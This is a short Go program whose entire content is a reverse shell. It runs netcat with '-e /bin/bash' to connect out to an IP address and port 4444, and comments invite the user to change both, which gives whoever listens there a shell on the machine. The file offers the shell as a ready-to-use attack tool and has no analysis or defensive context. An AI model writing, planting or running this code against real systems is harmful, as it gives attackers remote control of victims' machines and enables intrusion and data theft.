package main

import (
	"fmt"
	"os/exec"
)

func main() {
	ip := "192.168.1.95" //change this
	port := "4444" //change this
	out, err := exec.Command("nc", "-e", "/bin/bash", ip, port).Output()
	if err != nil {
		panic(err)
	}
	output := string(out[:])
	fmt.Println(output)
}
